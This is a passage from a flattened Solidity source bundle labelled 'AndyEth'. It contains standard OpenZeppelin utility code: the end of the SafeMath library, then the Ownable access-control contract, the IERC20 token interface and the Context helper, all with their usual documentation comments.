     * _Available since v3.4._
     */
    function tryDiv(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator.
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

// File: AndyEth/Ownable.sol
// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.9.0) (access/Ownable.sol)

pragma solidity ^0.8.0;

import "./Context.sol";

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby disabling any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

// File: AndyEth/IERC20.sol
// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.9.0) (token/ERC20/IERC20.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

// File: AndyEth/Context.sol
// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

pragma solidity ^0.8.0;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
